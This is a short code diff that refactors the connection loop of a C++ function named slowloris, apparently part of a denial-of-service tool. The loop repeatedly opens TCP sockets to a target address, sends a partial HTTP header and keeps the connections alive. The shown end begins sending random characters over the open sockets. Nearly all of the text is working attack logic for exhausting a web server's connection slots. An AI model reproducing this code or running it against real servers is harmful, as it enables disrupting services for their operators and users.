@@ -37,18 +37,16 @@ void slowloris () {
   while (true) {
     int open = sockets.size();
     std::chrono::milliseconds timeout(rand() % 10000 + 1);
-    if (open < connections) {
-      for (;open < connections;) {
-        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (s >= 0) {
-          setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &keep_alive, sizeof(keep_alive));
-          connect(s, (sockaddr*)&socket_address, sizeof(sockaddr_in));
-          send(s, header, sizeof(header) - 1, 0);
-          sockets.push_back(s);
-          open++;
-        }
-        else std::this_thread::sleep_for(timeout);
+    while (open < connections) {
+      int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+      if (s >= 0) {
+        setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &keep_alive, sizeof(keep_alive));
+        connect(s, (sockaddr*)&socket_address, sizeof(sockaddr_in));
+        send(s, header, sizeof(header) - 1, 0);
+        sockets.push_back(s);
+        open++;
       }
+      else std::this_thread::sleep_for(timeout);
     }
     for (int i = 0; i < open - 1;) {
       char next_value = 'a' + rand() % 26;
